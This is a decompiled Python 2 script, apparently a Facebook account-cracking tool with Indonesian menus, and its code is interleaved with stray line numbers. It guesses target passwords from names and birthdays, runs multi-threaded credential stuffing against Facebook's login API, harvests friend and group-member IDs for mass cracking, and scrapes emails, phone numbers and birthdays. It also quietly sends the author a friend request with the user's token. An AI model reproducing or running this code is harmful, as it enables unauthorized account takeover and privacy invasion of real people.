#Decompiled by MUHAMMAD RAFID



import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize



from multiprocessing.pool import ThreadPool





from requests.exceptions import ConnectionError



from mechanize import Browser



reload(sys)



sys.setdefaultencoding('utf8')



br = mechanize.Browser()


br.set_handle_robots(False)



br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)



br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]





def keluar():



print '\x1b[1;91m[!] Keluar'



os.sys.exit()






def jalan(z):



for e in z + '\n':



sys.stdout.write(e)



sys.stdout.flush()



time.sleep(0.01)







logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80 \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4 \xe2\x95\x9a \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor \x1b[1;91m: \x1b[1;96mMR.K7C8NG\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mInDoNeSiA CYBER ErRoR SyStEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mGUNAKAN DENGAN BIJAK \x1b[1;97m/ \x1b[1;96mMR.K7C8NG\n\x1b[1;93m* \x1b[1;97mGitHub \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/muhammadrafid\x1b[0m\n[*] Decompiled by MUHAMMAD RAFID\n'





def tik():



titik = [

 

'. ', '.. ', '... ']



for o in titik:



print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk COK \x1b[1;97m' + o,



sys.stdout.flush()



time.sleep(1)







back = 0



threads = []



berhasil = []



cekpoint = []



gagal = []



idteman = []



idfromteman = []



idmem = []



id = []



em = []



emfromteman = []






hp = []



hpfromteman = []



reaksi = []



reaksigrup = []



komen = []



komengrup = []



listgrup = []



vulnot = '\x1b[31mNot Vuln'

5


vuln = '\x1b[32mVuln'







def login():



os.system('clear')



try:



toket = open('login.txt', 'r')



menu()



except (KeyError, IOError):



os.system('clear')



print logo



print 40 * '\x1b[1;97m\xe2\x95\x90'



print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'




id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')



pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')



tik()



try:



br.open('https://m.facebook.com')



except mechanize.URLError:



print '\n\x1b[1;91m[!] Tidak ada koneksi'



keluar()





br._factory.is_html = True



br.select_form(nr=0)



br.form['email'] = id



br.form['pass'] = pwd



br.submit()



url = br.geturl()



if 'save-device' in url:



try:



sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'



data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}



x = hashlib.new('md5')



x.update(sig)



a = x.hexdigest()



data.update({'sig': a})



url = 'https://api.facebook.com/restserver.php'



r = requests.get(url, params=data)



z = json.loads(r.text)



zedd = open('login.txt', 'w')



zedd.write(z['access_token'])



zedd.close()



print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'



requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])



os.system('xdg-open https://youtube.com/NjankSoekamti')


time.sleep(2)

102

menu()

103

except requests.exceptions.ConnectionError:

104

print '\n\x1b[1;91m[!] Tidak ada koneksi'

105

keluar()

106

107

if 'checkpoint' in url:

108

print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'

109

os.system('rm -rf login.txt')

110

time.sleep(1)

111

keluar()

112

else:

113

print '\n\x1b[1;91m[!] Login Gagal'

114

os.system('rm -rf login.txt')

115

time.sleep(1)

116

login()

117

118

119

def menu():

120

os.system('clear')

121

try:

122

toket = open('login.txt', 'r').read()

123

except IOError:

124

os.system('clear')

125

print '\x1b[1;91m[!] Token tidak ditemukan'

126

os.system('rm -rf login.txt')

127

time.sleep(1)

128

login()

129

else:

130

try:

131

otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)

132

a = json.loads(otw.text)

133

nama = a['name']

134

id = a['id']

135

except KeyError:

136

os.system('clear')

137

print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'

138

os.system('rm -rf login.txt')

139

time.sleep(1)

140

login()

141

except requests.exceptions.ConnectionError:

142

print '\x1b[1;91m[!] Tidak ada koneksi'

143

keluar()

144

145

os.system('clear')

146

print logo

147

print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'

148

print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama

149

print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'

150

print '\x1b[1;37;40m1. Informasi Pengguna'

151

print '\x1b[1;37;40m2. Hack Akun Facebook'

152

print '\x1b[1;37;40m3. Bot '

153

print '\x1b[1;37;40m4. Lainnya.... '

154

print '\x1b[1;37;40m5. LogOut '

155

print '\x1b[1;31;40m0. Keluar '

156

print

157

pilih()

158

159

160

def pilih():

161

zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')

162

if zedd == '':

163

print '\x1b[1;91m[!] Jangan kosong'

164

pilih()

165

else:

166

if zedd == '1':

167

informasi()

168

else:

169

if zedd == '2':

170

menu_hack()

171

else:

172

if zedd == '3':

173

menu_bot()

174

else:

175

if zedd == '4':

176

lain()

177

else:

178

if zedd == '5':

179

os.system('rm -rf login.txt')

180

os.system('xdg-open https://www.youtube.com/nganunymous')

181

keluar()

182

else:

183

if zedd == '0':

184

keluar()

185

else:

186

print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'

187

pilih()

188

189

190

def informasi():

191

os.system('clear')

192

try:

193

toket = open('login.txt', 'r').read()

194

except IOError:

195

print '\x1b[1;91m[!] Token tidak ditemukan'

196

os.system('rm -rf login.txt')



time.sleep(1)



login()





os.system('clear')

print logo

202

print 40 * '\x1b[1;97m\xe2\x95\x90'

203

id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')

204

jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')

205

r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)

206

cok = json.loads(r.text)

207

for p in cok['data']:

208

if id in p['name'] or id in p['id']:

209

r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)

210

z = json.loads(r.text)

211

print 40 * '\x1b[1;97m\xe2\x95\x90'

212

try:

213

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + z['name']

214

except KeyError:

215

print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m : \x1b[1;91mTidak ada'

216

else:

217

try:

218

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m : ' + z['id']

219

except KeyError:

220

print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m : \x1b[1;91mTidak ada'

221

else:

222

try:

223

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m : ' + z['email']

224

except KeyError:

225

print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m : \x1b[1;91mTidak ada'

226

else:

227

try:

228

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor HP\x1b[1;97m : ' + z['mobile_phone']

229

except KeyError:

230

print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m : \x1b[1;91mTidak ada'

231

232

try:

233

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m : ' + z['location']['name']

234

except KeyError:

235

print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m : \x1b[1;91mTidak ada'

236

237

try:

238

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']

239

except KeyError:

240

print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'

241

242

try:

243

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m : '

244

for q in z['education']:

245

try:

246

print '\x1b[1;91m ~ \x1b[1;97m' + q['school']['name']

247

except KeyError:

248

print '\x1b[1;91m ~ \x1b[1;91mTidak ada'

249

250

except KeyError:

251

pass

252

253

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

254

menu()

255

else:

256

print '\x1b[1;91m[\xe2\x9c\x96] Pengguna tidak ditemukan'

257

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

258

menu()

259

260

261

def menu_hack():

262

os.system('clear')

263

try:

264

toket = open('login.txt', 'r').read()

265

except IOError:

266

print '\x1b[1;91m[!] Token tidak ditemukan'

267

os.system('rm -rf login.txt')

268

time.sleep(1)

269

login()

270

271

os.system('clear')

272

print logo

273

print 40 * '\x1b[1;97m\xe2\x95\x90'

274

print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'

275

print '\x1b[1;37;40m2. Multi Bruteforce Facebook'

276

print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook'

277

print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'

278

print '\x1b[1;37;40m5. Yahoo Checker'

279

print '\x1b[1;37;40m6. Ambil id/email/hp'

280

print '\x1b[1;31;40m0. Kembali'

281

print

282

hack_pilih()

283

284

285

def hack_pilih():

286

hack = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')

287

if hack == '':

288

print '\x1b[1;91m[!] Jangan kosong'

289

hack_pilih()

290

else:

291

if hack == '1':

292

mini()

293

else:

294

if hack == '2':

295

crack()

296

hasil()

297

else:

298

if hack == '3':

299

super()

300

else:


if hack == '4':

302

brute()

303

else:

304

if hack == '5':

305

menu_yahoo()

306

else:

307

if hack == '6':

308

grab()

309

else:

310

if hack == '0':

311

menu()

312

else:

313

print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'

314

hack_pilih()

315

316

317

def mini():

318

os.system('clear')

319

try:

320

toket = open('login.txt', 'r').read()

321

except IOError:

322

print '\x1b[1;91m[!] Token tidak ditemukan'

323

os.system('rm -rf login.txt')

324

time.sleep(1)

325

login()

326

else:

327

os.system('clear')

328

print logo

329

print 40 * '\x1b[1;97m\xe2\x95\x90'

330

print '\x1b[1;91m[ INFO ] Akun target harus berteman dengan akun anda dulu !'

331

try:

332

id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')

333

jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')

334

r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)

335

a = json.loads(r.text)

336

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

337

jalan('\x1b[1;91m[+] \x1b[1;92mMemeriksa \x1b[1;97m...')

338

time.sleep(2)

339

jalan('\x1b[1;91m[+] \x1b[1;92mMembuka keamanan \x1b[1;97m...')

340

time.sleep(2)

341

jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu sebentar \x1b[1;97m...')

342

print 40 * '\x1b[1;97m\xe2\x95\x90'

343

pz1 = a['first_name'] + '123'

344

data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

345

y = json.load(data)

346

if 'access_token' in y:

347

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

348

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

349

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

350

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1

351

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

352

menu_hack()

353

else:

354

if 'www.facebook.com' in y['error_msg']:

355

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

356

print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'

357

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

358

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

359

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1

360

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

361

menu_hack()

362

else:

363

pz2 = a['first_name'] + '12345'

364

data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

365

y = json.load(data)

366

if 'access_token' in y:

367

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

368

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

369

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

370

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2

371

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

372

menu_hack()

373

else:

374

if 'www.facebook.com' in y['error_msg']:

375

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

376

print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'

377

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

378

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

379

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2

380

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

381

menu_hack()

382

else:

383

pz3 = a['last_name'] + '123'

384

data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

385

y = json.load(data)

386

if 'access_token' in y:

387

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

388

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

389

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

390

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3

391

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

392

menu_hack()

393

else:

394

if 'www.facebook.com' in y['error_msg']:

395

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

396

print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'

397

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

398

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

399

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3

400

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')


menu_hack()

402

else:

403

lahir = a['birthday']

404

pz4 = lahir.replace('/', '')

405

data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

406

y = json.load(data)

407

if 'access_token' in y:

408

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

409

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

410

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

411

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4

412

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

413

menu_hack()

414

else:

415

if 'www.facebook.com' in y['error_msg']:

416

print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'

417

print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'

418

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m : ' + a['name']

419

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id

420

print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4

421

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

422

menu_hack()

423

else:

424

print '\x1b[1;91m[!] Maaf, gagal membuka password target :('

425

print '\x1b[1;91m[!] Cobalah dengan cara lain.'

426

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

427

menu_hack()

428

except KeyError:

429

print '\x1b[1;91m[!] Terget tidak ditemukan'

430

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

431

menu_hack()

432

433

434

def crack():

435

global file

436

global idlist

437

global passw

438

os.system('clear')

439

try:

440

toket = open('login.txt', 'r').read()

441

except IOError:

442

print '\x1b[1;91m[!] Token tidak ditemukan'

443

os.system('rm -rf login.txt')

444

time.sleep(1)

445

login()

446

else:

447

os.system('clear')

448

print logo

449

print 40 * '\x1b[1;97m\xe2\x95\x90'

450

idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID \x1b[1;91m: \x1b[1;97m')

451

passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')

452

try:

453

file = open(idlist, 'r')

454

jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')

455

for x in range(40):

456

zedd = threading.Thread(target=scrak, args=())

457

zedd.start()

458

threads.append(zedd)

459

460

for zedd in threads:

461

zedd.join()

462

463

except IOError:

464

print '\x1b[1;91m[!] File tidak ditemukan'

465

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

466

menu_hack()

467

468

469

def scrak():

470

global back

471

global berhasil

472

global cekpoint

473

global gagal

474

global up

475

try:

476

buka = open(idlist, 'r')

477

up = buka.read().split()

478

while file:

479

username = file.readline().strip()

480

url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'

481

data = urllib.urlopen(url)

482

mpsh = json.load(data)

483

if back == len(up):

484

break

485

if 'access_token' in mpsh:

486

bisa = open('Berhasil.txt', 'w')

487

bisa.write(username + ' | ' + passw + '\n')

488

bisa.close()

489

berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)

490

back += 1

491

else:

492

if 'www.facebook.com' in mpsh['error_msg']:

493

cek = open('Cekpoint.txt', 'w')

494

cek.write(username + ' | ' + passw + '\n')

495

cek.close()

496

cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)

497

back += 1

498

else:

499

gagal.append(username)

500

back += 1

sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))

502

sys.stdout.flush()

503

504

except IOError:

505

print '\n\x1b[1;91m[!] Koneksi terganggu'

506

time.sleep(1)

507

except requests.exceptions.ConnectionError:

508

print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'

509

510

511

def hasil():

512

print

513

print 40 * '\x1b[1;97m\xe2\x95\x90'

514

for b in berhasil:

515

print b

516

517

for c in cekpoint:

518

print c

519

520

print

521

print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))

522

keluar()

523

524

525

def super():

526

global toket

527

os.system('clear')

528

try:

529

toket = open('login.txt', 'r').read()

530

except IOError:

531

print '\x1b[1;91m[!] Token tidak ditemukan'

532

os.system('rm -rf login.txt')

533

time.sleep(1)

534

login()

535

536

os.system('clear')

537

print logo

538

print 40 * '\x1b[1;97m\xe2\x95\x90'

539

print '\x1b[1;37;40m1. Crack dari daftar Teman'

540

print '\x1b[1;37;40m2. Crack dari member Grup'

541

print '\x1b[1;31;40m0. Kembali'

542

print

543

pilih_super()

544

545

546

def pilih_super():

547

peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')

548

if peak == '':

549

print '\x1b[1;91m[!] Jangan kosong'

550

pilih_super()

551

else:

552

if peak == '1':

553

os.system('clear')

554

print logo

555

print 40 * '\x1b[1;97m\xe2\x95\x90'

556

jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')

557

r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)

558

z = json.loads(r.text)

559

for s in z['data']:

560

id.append(s['id'])

561

562

else:

563

if peak == '2':

564

os.system('clear')

565

print logo

566

print 40 * '\x1b[1;97m\xe2\x95\x90'

567

idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup \x1b[1;91m:\x1b[1;97m ')

568

try:

569

r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)

570

asw = json.loads(r.text)

571

print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']

572

except KeyError:

573

print '\x1b[1;91m[!] Grup tidak ditemukan'

574

raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')

575

super()

576

577

re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)

578

s = json.loads(re.text)

579

for i in s['data']:

580

id.append(i['id'])

581

582

else:

583

if peak == '0':

584

menu_hack()

585

else:

586

print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'

587

pilih_super()

588

print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))

589

jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')

590

titik = ['. ', '.. ', '... ']

591

for o in titik:

592

print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,

593

sys.stdout.flush()

594

time.sleep(1)

595

596

print

597

print 40 * '\x1b[1;97m\xe2\x95\x90'

598

599

def main(arg):

600

user = arg


